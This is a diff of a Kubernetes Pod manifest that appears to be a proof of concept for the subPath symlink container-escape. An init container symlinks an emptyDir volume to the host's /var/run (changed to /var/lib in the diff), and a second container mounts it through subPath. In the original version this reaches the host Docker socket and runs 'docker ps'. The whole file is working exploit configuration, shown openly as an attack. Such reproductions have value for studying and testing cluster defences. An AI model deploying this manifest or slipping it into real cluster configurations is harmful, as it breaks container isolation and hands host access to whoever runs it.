@@ -1,23 +1,23 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: secbypass
+  name: secbypass-bad-subpath-var-lib
 spec:
   initContainers:
   - name: prep-symlink
-    image: "joelsmith/docker-suid:latest"
-    command: ['ln', '-s', '/var/run', '/tmp/host-var-run']
+    image: "docker:stable"
+    command: ['ln', '-s', '/var/lib', '/tmp/host-var-run']
     volumeMounts:
     - name: docker-socket
       mountPath: /tmp/
   containers:
   - name: all-your-base-are-belong-to-us
-    image: "joelsmith/docker-suid:latest"
-    command: ["/bin/sh", "-ec", "docker ps; /bin/sleep 999999"]
+    image: "docker:stable"
+    command: ["/bin/sh", "-ec", "/bin/sleep 999999"]
     volumeMounts:
     - name: docker-socket
       subPath: host-var-run
-      mountPath: /var/run
+      mountPath: /var/lib
   volumes:
   - name: docker-socket
     emptyDir: {}
